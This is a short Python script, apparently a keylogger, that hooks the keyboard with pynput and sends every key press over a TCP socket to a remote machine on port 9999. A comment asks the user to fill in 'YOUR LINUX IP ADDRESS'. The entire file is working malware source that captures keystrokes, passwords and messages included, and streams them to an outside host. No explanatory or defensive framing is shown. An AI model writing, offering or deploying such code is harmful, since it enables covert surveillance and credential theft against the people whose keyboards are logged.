import socket
from pynput import keyboard

# CHANGE THIS TO YOUR LINUX IP ADDRESS
TARGET_IP = "192.168.x.xx" 

sender = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sender.connect((TARGET_IP, 9999))
print(f"Successfully connected to {TARGET_IP}")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            sender.send(f"{key.char}\n".encode())
        elif hasattr(key, 'name') and key.name:
            sender.send(f"{key.name}\n".encode())
    except Exception:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
